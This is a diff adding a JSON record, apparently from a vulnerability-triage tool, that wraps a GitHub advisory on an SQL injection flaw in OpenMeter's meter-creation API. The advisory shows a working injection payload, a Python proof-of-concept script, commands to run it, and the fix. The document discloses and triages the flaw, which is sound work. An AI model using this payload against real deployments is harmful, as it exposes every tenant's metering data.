@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [], \"cve_id\": \"CVE-2026-8462\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 5.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}], \"description\": \"### Summary\\n\\nAn authenticated tenant can inject arbitrary SQL through the `valueProperty` or `groupBy` fields of `POST /api/v1/meters`. The injection passes the application's JSONPath validation check and executes against the shared ClickHouse database, which contains event data for all tenants with no row-level security. Any authenticated tenant can read or write every other tenant's metering data.\\n\\n### Details\\n\\n`openmeter/streaming/clickhouse/utils_query.go:15` builds a ClickHouse `SELECT` by interpolating user input with `fmt.Sprintf`:\\n\\n```go\\nsb.Select(fmt.Sprintf(\\\"JSON_VALUE('{}', '%s')\\\", sqlbuilder.Escape(d.jsonPath)))\\n```\\n\\n`sqlbuilder.Escape()` (go-sqlbuilder v1.40.2) only replaces `$` → `$$` to prevent collisions with the library's own argument placeholders. It does not escape single quotes. A single quote in the input closes the string literal, and subsequent tokens execute as raw SQL. `sb.Build()` always returns an empty `args` slice — the query is never parameterized.\\n\\nThe payload must be prefixed with a valid JSONPath expression (e.g. `$.foo`) because ClickHouse raises error code 36 (BAD_ARGUMENTS) on an empty JSONPath string, which `ValidateJSONPath` silently treats as \\\"invalid JSONPath\\\" and returns early — before the injected branch can execute.\\n\\nWorking payload:\\n```\\n$.foo') UNION ALL SELECT toString(sleep(3)) FROM system.one --\\n```\\n\\nGenerated SQL:\\n```sql\\nSELECT JSON_VALUE('{}', '$.foo') UNION ALL SELECT toString(sleep(3)) FROM system.one --'\\n```\\n\\nFix — replace `fmt.Sprintf` string interpolation with `sb.Var()`, which appends the value to the builder's args list and emits a `?` placeholder:\\n\\n```diff\\n-sb.Select(fmt.Sprintf(\\\"JSON_VALUE('{}', '%s')\\\", sqlbuilder.Escape(d.jsonPath)))\\n+sb.Select(fmt.Sprintf(\\\"JSON_VALUE('{}', %s)\\\", sb.Var(d.jsonPath)))\\n```\\n\\n### PoC\\n\\n`poc.py`:\\n\\n```python\\nimport json, time, uuid\\nfrom urllib.request import Request, urlopen\\n\\nSLEEP   = 3\\nAPI     = \\\"http://localhost:48888\\\"\\nPAYLOAD = f\\\"$.foo') UNION ALL SELECT toString(sleep({SLEEP})) FROM system.one --\\\"\\n\\ndef post_meter(value_property):\\n    body = json.dumps({\\n        \\\"slug\\\":          f\\\"poc_{uuid.uuid4().hex[:8]}\\\",\\n        \\\"eventType\\\":     \\\"x\\\",\\n        \\\"aggregation\\\":   \\\"SUM\\\",\\n        \\\"valueProperty\\\": value_property,\\n    }).encode()\\n    req = Request(f\\\"{API}/api/v1/meters\\\", data=body,\\n                  headers={\\\"Content-Type\\\": \\\"application/json\\\"}, method=\\\"POST\\\")\\n    t0 = time.monotonic()\\n    with urlopen(req, timeout=SLEEP + 10) as r:\\n        return r.status, time.monotonic() - t0\\n\\n_, baseline = post_meter(\\\"$.tokens\\\")\\nstatus, elapsed = post_meter(PAYLOAD)\\n\\nprint(f\\\"baseline : {baseline:.3f}s\\\")\\nprint(f\\\"injected : {elapsed:.3f}s  (HTTP {status})\\\")\\nprint(f\\\"result   : sleep({SLEEP}) {'CONFIRMED' if elapsed >= baseline + SLEEP - 0.5 else 'not confirmed'}\\\")\\n```\\n\\n```shell\\ndocker compose up -d\\nuntil curl -sf http://localhost:48888/api/v1/meters > /dev/null; do sleep 3; done\\npython3 poc.py\\n```\\n\\nExpected output:\\n```\\nbaseline : 0.036s\\ninjected : 3.031s  (HTTP 200)\\nresult   : sleep(3) CONFIRMED\\n```\\n\\n### Impact\\n\\nSQL injection via `POST /api/v1/meters` (`valueProperty` or `groupBy`). Requires a valid tenant API key; no other preconditions. The shared `openmeter.om_events` table has no row-level security — a successful injection gives unrestricted read access to all tenants' event subjects, types, payloads, and timestamps. Write access is subject to the ClickHouse user's grants. Denial of service via resource-exhausting queries is also possible.\\n\\n### Attribution\\nThis vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by Shoshana Makinen at Anvil Secure in collaboration with Anthropic Research.\\n\\nFor CVE credits and public acknowledgments: Anvil Secure in collaboration with Claude and Anthropic Research\", \"epss\": {\"percentage\": 0.00036, \"percentile\": 0.11123}, \"ghsa_id\": \"GHSA-wc3v-3457-c8cm\", \"github_reviewed_at\": \"2026-06-04T18:39:52Z\", \"html_url\": \"https://github.com/advisories/GHSA-wc3v-3457-c8cm\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wc3v-3457-c8cm\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-8462\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-04T18:39:52Z\", \"references\": [\"https://github.com/openmeterio/openmeter/security/advisories/GHSA-wc3v-3457-c8cm\", \"https://github.com/openmeterio/openmeter/pull/4383\", \"https://github.com/openmeterio/openmeter/commit/6ce29e743165890c10346f4c71d5bf79f1ecaf6f\", \"https://github.com/openmeterio/openmeter/releases/tag/v1.0.0-beta.228\", \"https://github.com/advisories/GHSA-wc3v-3457-c8cm\"], \"repository_advisory_url\": \"https://api.github.com/repos/openmeterio/openmeter/security-advisories/GHSA-wc3v-3457-c8cm\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/openmeterio/openmeter\", \"summary\": \"OpenMeter: SQL injection through meter creation\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-04T18:39:53Z\", \"url\": \"https://api.github.com/advisories/GHSA-wc3v-3457-c8cm\", \"vulnerabilities\": [{\"first_patched_version\": \"1.0.0-beta.228\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/openmeterio/openmeter\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.0.0-beta.228\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wc3v-3457-c8cm",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/openmeterio/openmeter: < 1.0.0-beta.228"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-8462"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/openmeterio/openmeter"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.865033Z",
+  "provenance": {
+    "content_sha256": "bbd436b10bb96d5efe0cbf45fd20a87275e0ffa95c561cf825835c7e1c02817b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-04T18:39:52Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wc3v-3457-c8cm",
+  "status": "active",
+  "title": "OpenMeter: SQL injection through meter creation",
+  "updated_at": "2026-06-04T18:39:53Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wc3v-3457-c8cm"
+}
